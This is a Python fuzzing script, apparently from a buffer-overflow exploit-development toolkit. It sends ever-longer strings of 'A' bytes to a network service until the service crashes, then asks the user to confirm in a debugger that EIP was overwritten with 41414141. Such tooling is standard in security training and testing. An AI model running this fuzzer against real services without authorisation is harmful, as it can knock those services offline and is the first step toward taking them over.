#!/usr/bin/env python3

import socket, time, sys
import options


def fuzz(ip, port):
    timeout = 15
    load = "A" * 100

    while True:
        data = options.prefix + load + options.postfix

        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(timeout)
                sock.connect((ip, port))

                # Receive banner/greeting messages. Comment out if not needed
                # Or add more if required
                sock.recv(1024)

                # DO NOT change
                print(f"[*] Fuzzing with {len(data) - len(options.prefix) - len(options.postfix)} bytes")
                sock.send(bytes(data, "latin-1"))

                # Receive ending messages. Comment out if not needed
                # Or add more if required
                sock.recv(1024)

        except Exception as e:
            print(f"[!] Connection Error at {len(data) - len(options.prefix) - len(options.postfix)} bytes")
            print(f"[!] Exception: {e}")
            print("[i] Please confirm from the debugger that the EIP is 41414141")
            sys.exit(0)

        load += "A" * 100
        time.sleep(5)
